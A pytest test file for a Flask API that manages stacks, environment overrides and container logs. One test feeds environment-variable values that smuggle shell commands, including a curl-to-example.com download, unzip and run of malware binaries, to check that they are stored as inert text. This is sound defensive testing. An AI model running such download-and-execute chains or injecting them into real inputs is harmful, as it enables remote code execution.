import os
import shutil
from pathlib import Path

import pytest


def assert_file_exists_and_has_content(path: Path, expected_content: str | bytes, binary: bool = False):
    assert path.exists()

    with open(path, "r" if not binary else "rb") as file:
        actual_content = file.read()
        assert actual_content == expected_content


def assert_env_overrides_content(env_overrides_path_path: Path, expected_content: str, expected_env_overrides_dir: Path):
    # This file stores the filename of the env overrides
    assert env_overrides_path_path.exists()

    # Get filename of the env overrides
    with open(env_overrides_path_path, "r") as file:
        env_overrides_path = file.read().rstrip()

    assert Path(env_overrides_path).parent == expected_env_overrides_dir

    # Env overrides should be empty
    assert_file_exists_and_has_content(Path(env_overrides_path), expected_content)


def test_get_stacks(client):
    response = client.get('/api/stacks')

    # Assert status code
    assert response.status_code == 200
    assert response.content_type == "application/json"

    # Assert that response.json is a dictionary and contains a list named "stacks"
    assert isinstance(response.json, dict)
    assert "stacks" in response.json and isinstance(response.json["stacks"], list)

    # Assert that the list named "stacks" contains exactly 4 items with specific stack names
    expected_stacks = [
        {"stack_name": "stack1_correct_makefile"},
        {"stack_name": "stack2_empty_makefile"},
        {"stack_name": "stack3_stop_fails"}
    ]
    assert len(response.json["stacks"]) == 3
    assert all(item in response.json["stacks"] for item in expected_stacks)


def test_start_stack_with_correct_makefile(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile')

    # Assertion 1: response has status code 200
    assert response.status_code == 200

    # Assertion 2: check the content of the file "started"
    assert_file_exists_and_has_content(
        tmp_path / "test_instance" / "stack1_correct_makefile_started",
        "STARTED\n"
    )


def test_start_stack_with_empty_makefile(tmp_path, client):
    response = client.post('/api/stack/stack2_empty_makefile')

    assert response.status_code == 500


def test_start_stack_that_doesnt_exist(tmp_path, client):
    response = client.post('/api/stack/stack4_doesnt_exist')

    assert response.status_code == 404


def test_start_stack_with_empty_payload(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile', json={})

    assert response.status_code == 200

    assert_env_overrides_content(tmp_path / "test_instance" / "stack1_env_overrides_path", "",
                                 client.application.config["ENV_OVERRIDES_DIR"])


def test_start_stack_with_malformed_payload(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile', json={"env": "this should be a dictionary"})

    assert response.status_code == 400

    assert not (tmp_path / "test_instance" / "stack1_correct_makefile_started").exists()


def test_start_stack_with_plaintext_payload(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile', data="This should be JSON")

    assert response.status_code == 415

    assert not (tmp_path / "test_instance" / "stack1_correct_makefile_started").exists()


def test_start_stack_with_payload_with_empty_env_dictionary(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile', json={"env": {}})

    assert response.status_code == 200

    assert_env_overrides_content(tmp_path / "test_instance" / "stack1_env_overrides_path", "",
                                 client.application.config["ENV_OVERRIDES_DIR"])


def test_start_stack_with_payload_with_overridden_env_vars(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile',
                           json={"env": {"ENV1": "overridden_val1", "ENV5": "new_val5"}})

    assert response.status_code == 200

    assert_env_overrides_content(tmp_path / "test_instance" / "stack1_env_overrides_path",
                                 "ENV1=overridden_val1\nENV5=new_val5\n",
                                 client.application.config["ENV_OVERRIDES_DIR"])


def test_start_stack_with_payload_with_overridden_env_file(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile',
                           json={"env_file": "ENV1=val1\nENV2=val2\n"})

    assert response.status_code == 200

    assert_env_overrides_content(tmp_path / "test_instance" / "stack1_env_overrides_path",
                                 "ENV1=val1\nENV2=val2\n",
                                 client.application.config["ENV_OVERRIDES_DIR"])


def test_start_stack_with_payload_with_overridden_env_vars_and_env_file(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile',
                           json={"env": {"ENVV1": "valv1", "ENVV2": "valv2"}, "env_file": "ENVF1=valf1\nENVF2=valf2\n"})

    assert response.status_code == 400

    assert not (tmp_path / "test_instance" / "stack1_correct_makefile_started").exists()


def test_start_stack_with_payload_with_env_vars_with_shell_special_characters(tmp_path, client):
    response = client.post('/api/stack/stack1_correct_makefile',
                           json={"env": {
                               "ENV1": "echo `./execute_malware`;",
                               "ENV2": "echo $(./execute_malware)",
                               "ENV3": "`curl example.com | decrypt > malware.zip && unzip malware.zip && "
                                       "(./malware_x86.bin || ./malware_arm64.bin || ./malware_mips.bin)`",
                               "ENV4": "'test1' \"test2\" $(test3) `test4`"
                           }})

    assert response.status_code == 200

    # Get filename of the env overrides
    env_overrides_path_path = tmp_path / "test_instance" / "stack1_env_overrides_path"
    with open(env_overrides_path_path, "r") as file:
        env_overrides_path = file.read().rstrip()

    # Execute Env Overrides
    with (open(tmp_path / env_overrides_path, "r")
          as env_overrides):
        env_overrides_content = env_overrides.read()
        # Execute the stored env file and output content of all test variables.
        # Check if something undesired was executed.
        with os.popen(env_overrides_content + "\necho $ENV1\necho $ENV2\necho $ENV3\necho $ENV4") as p:
            assert p.readline() == "echo `./execute_malware`;\n"
            assert p.readline() == "echo $(./execute_malware)\n"
            assert p.readline() == "`curl example.com | decrypt > malware.zip && unzip malware.zip && " \
                                   "(./malware_x86.bin || ./malware_arm64.bin || ./malware_mips.bin)`\n"
            assert p.readline() == "'test1' \"test2\" $(test3) `test4`\n"
            assert p.read() == ""
        # RC should be 0
        assert not p.close()


def test_stop_stack_successfully(tmp_path, client):
    response = client.delete('/api/stack/stack1_correct_makefile')

    assert response.status_code == 200

    assert_file_exists_and_has_content(tmp_path / "test_instance" / "stack1_correct_makefile_stopped",
                                       "STOPPED\n")


def test_stop_stack_with_empty_makefile(tmp_path, client):
    response = client.delete('/api/stack/stack2_empty_makefile')

    assert response.status_code == 500


def test_stop_stack_where_stack_name_does_not_exist(tmp_path, client):
    response = client.delete('/api/stack/stack4_does_not_exist')

    assert response.status_code == 404


def test_stop_stack_fails(tmp_path, client):
    response = client.delete('/api/stack/stack3_stop_fails')

    assert response.status_code == 500


def test_get_containers_successful(tmp_path, client):
    response = client.get('/api/containers')

    assert response.status_code == 200
    assert response.content_type == "application/json"

    assert response.json == {
        "containers": [
            {
                "host": "node1",
                "container_id": "123abc",
                "container_name": "srsran_enb",
                "status": {"state": "running"}
            }
        ]
    }


def test_get_containers_fails(tmp_path, client):
    # Overwrite with empty status.py
    shutil.copy(tmp_path / "test_instance" / "status_empty.py", tmp_path / "test_instance" / "status.py")

    with pytest.raises(AttributeError):
        response = client.get('/api/containers')


def test_get_containers_raises(tmp_path, client):
    # Overwrite with status.py that raises Exception
    shutil.copy(tmp_path / "test_instance" / "status_raises.py", tmp_path / "test_instance" / "status.py")

    with pytest.raises(ConnectionError):
        response = client.get('/api/containers')


def test_get_container_logs_successful_without_parameters_plain(tmp_path, client):
    response = client.get('/api/container/host1/container123/logs', headers={"Accept": "text/plain"})

    assert response.status_code == 200
    assert response.content_type == "text/plain"

    assert response.text == (
        f"2023-12-24T18:00:00.123456789Z It is christmas! \n"
        f"2023-12-24T18:00:01.123456789Z Host host1 \n"
        f"2023-12-24T18:00:02.123456789Z Container ID container123 \n"
        f"2023-12-24T18:00:03.123456789Z Stdout True \n"
        f"2023-12-24T18:00:04.123456789Z Stderr True \n"
        f"2023-12-24T18:00:05.123456789Z ERROR\n"
        f"2023-12-24T18:00:06.123456789Z Timestamps True \n"
        f"2023-12-24T18:00:07.123456789Z Tail all \n"
        f"2023-12-24T18:00:08.123456789Z Since None \n"
        f"2023-12-24T18:00:10.123456789Z Until None \n"
    )


@pytest.mark.parametrize("since", [
    ("2023-12-24T12:34:56+00:00", "2023-12-24T12:34:56"),
    ("2023-12-24T16:34:56+04:00", "2023-12-24T12:34:56"),
    ("2023-12-24T12:34:56Z", "2023-12-24T12:34:56"),
    ("2023-12-24T12:34:56.123+00:00", "2023-12-24T12:34:56.123000"),
    ("2023-12-24T12:34:56.123Z", "2023-12-24T12:34:56.123000")
])
def test_get_container_logs_successful_with_parameters_plain(tmp_path, client, since):
    response = client.get('/api/container/host1/container123/logs',
                          query_string={"stdout": "True", "stderr": "False", "timestamps": "False", "tail": 37,
                                        "since": since[0], "until": "2023-12-26T23:04:00+04:00"},
                          headers={"Accept": "text/plain"})

    assert response.status_code == 200
    assert response.content_type == "text/plain"

    assert response.text == (
        f"It is christmas! \n"
        f"Host host1 \n"
        f"Container ID container123 \n"
        f"Stdout True \n"
        f"Stderr False \n"
        f"Timestamps False \n"
        f"Tail 37 \n"
        f"Since {since[1]} \n"
        f"Until 2023-12-26T19:04:00 \n"
    )


def test_get_container_logs_successful_with_parameters_json(tmp_path, client):
    response = client.get('/api/container/host1/container123/logs',
                          query_string={"stdout": "True", "stderr": "True", "timestamps": "True", "tail": 37,
                                        "since": "2023-12-24T12:34:56+00:00", "until": "2023-12-26T23:04:00+04:00"},
                          headers={"Accept": "application/json"})

    assert response.status_code == 200
    assert response.content_type == "application/json"

    assert response.json == {
        "log_lines": [
            {"time": "2023-12-24T18:00:00.123456789Z", "log": "It is christmas! ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:01.123456789Z", "log": "Host host1 ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:02.123456789Z", "log": "Container ID container123 ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:03.123456789Z", "log": "Stdout True ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:04.123456789Z", "log": "Stderr False ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:05.123456789Z", "log": "ERROR", "stream": "stderr"},
            {"time": "2023-12-24T18:00:06.123456789Z", "log": "Timestamps True ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:07.123456789Z", "log": "Tail 37 ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:08.123456789Z", "log": "Since 2023-12-24T12:34:56 ", "stream": "stdout"},
            {"time": "2023-12-24T18:00:10.123456789Z", "log": "Until 2023-12-26T19:04:00 ", "stream": "stdout"}
        ]
    }


def test_get_container_logs_json_without_timestamps_fails(tmp_path, client):
    response = client.get('/api/container/host1/container123/logs',
                          query_string={"stdout": "True", "stderr": "True", "timestamps": "False", "tail": 37,
                                        "since": "2023-12-24T12:34:56+00:00", "until": "2023-12-26T19:04:00+04:00"},
                          headers={"Accept": "application/json"})

    assert response.status_code == 400


def test_get_container_logs_fails(tmp_path, client):
    # Overwrite with empty status.py
    shutil.copy(tmp_path / "test_instance" / "status_empty.py", tmp_path / "test_instance" / "status.py")

    with pytest.raises(AttributeError):
        response = client.get('/api/container/host1/container123/logs',
                              query_string={"stdout": "True", "stderr": "False", "timestamps": "True", "tail": 37,
                                            "since": "2023-12-24T12:34:56+00:00", "until": "2023-12-26T19:04:00+04:00"})


def test_get_container_logs_raises(tmp_path, client):
    # Overwrite with empty status.py
    shutil.copy(tmp_path / "test_instance" / "status_raises.py", tmp_path / "test_instance" / "status.py")

    with pytest.raises(ConnectionError):
        response = client.get('/api/container/host1/container123/logs',
                              query_string={"stdout": "True", "stderr": "False", "timestamps": "True", "tail": 37,
                                            "since": "2023-12-24T12:34:56+00:00", "until": "2023-12-26T19:04:00+04:00"})


def test_get_container_logs_container_not_found(tmp_path, client):
    # Overwrite with empty status.py
    shutil.copy(tmp_path / "test_instance" / "status_container_not_found.py", tmp_path / "test_instance" / "status.py")

    response = client.get('/api/container/host1/container123/logs',
                          query_string={"stdout": "True", "stderr": "False", "timestamps": "True", "tail": 37,
                                        "since": "2023-12-24T12:34:56+00:00", "until": "2023-12-26T19:04:00+04:00"})

    assert response.status_code == 404


def test_get_global_env_successful(tmp_path, client):
    response = client.get('/api/global_env')

    assert response.status_code == 200
    assert response.content_type == "text/x-sh"

    assert response.text == "ENV1=val1\nENV2=val2\nENV3=val3\n"


def test_get_global_env_doesnt_exist(tmp_path, client):
    os.remove(tmp_path / "test_instance" / "etc" / "settings.env")

    response = client.get('/api/global_env')

    assert response.status_code == 404


def test_get_specific_env_successful(tmp_path, client):
    response = client.get('/api/stack/stack1_correct_makefile/env')

    assert response.status_code == 200
    assert response.content_type == "text/x-sh"

    assert response.text == "ENV2=changed_value2\nENV4=new_value4\n"


def test_get_specific_env_doesnt_exist(tmp_path, client):
    response = client.get('/api/stack/stack2_empty_makefile/env')

    assert response.status_code == 404

def test_get_env_overrides_successful(tmp_path, client):
    # Create env overrides file
    client.post('/api/stack/stack1_correct_makefile', json={"env_file": "ENV1=val1\nENV2=val2\n"})

    # Now try to get env overrides file
    response = client.get('/api/stack/stack1_correct_makefile/env_overrides')

    assert response.status_code == 200
    assert response.content_type == "text/x-sh"

    assert response.text == "ENV1=val1\nENV2=val2\n"


def test_get_env_overrides_doesnt_exist(tmp_path, client):
    response = client.get('/api/stack/stack1_correct_makefile/env_overrides')

    assert response.status_code == 404


def test_get_env_overrides_stack_doesnt_exist(tmp_path, client):
    response = client.get('/api/stack/stack4_doesnt_exist/env_overrides')

    assert response.status_code == 404
